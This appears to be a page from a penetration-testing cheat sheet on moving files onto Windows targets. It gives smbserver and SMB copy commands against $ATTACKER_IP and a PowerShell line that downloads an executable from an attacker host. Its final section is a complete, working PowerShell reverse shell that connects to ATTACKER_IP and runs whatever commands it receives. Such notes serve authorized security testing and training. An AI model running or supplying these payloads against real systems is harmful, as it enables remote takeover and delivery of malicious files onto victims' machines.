---
sidebar_position: 2
title: File Transfer
---

## SMBSERVER  

- **Transfer Files to Windows with `SMB`** 

```powershell
smbserver $SHARE_NAME $DIRECTORY                # Modern
smbserver -smb2support $SHARE_NAME $DIRECTORY   # Legacy
```

- **`SMB` Remote Commands**

```powershell
dir \\$ATTACKER_IP\$DIRECTORY                   # List Share Contents
copy \\$ATTACKER_IP\$DIRECTORY\$FILE $FILE      # Transfer Files
```


## PSH

- **Transfer Files**

```powershell
powershell (New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP:PORT/FileName.exe','FileName.exe')
```


- **Reverse Shell [It may be Necessary to Encode the PAYLOAD Format]**

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

